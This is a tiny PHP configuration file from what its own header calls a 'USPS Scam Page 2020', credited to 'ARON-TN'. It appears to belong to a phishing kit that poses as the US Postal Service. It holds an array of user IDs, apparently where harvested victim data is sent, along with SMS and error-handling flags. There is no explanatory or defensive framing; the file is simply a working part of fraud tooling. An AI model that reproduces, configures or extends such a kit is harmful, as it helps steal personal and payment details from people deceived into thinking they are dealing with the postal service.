<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("2051870235");
$sms='3';
$error='0';
?>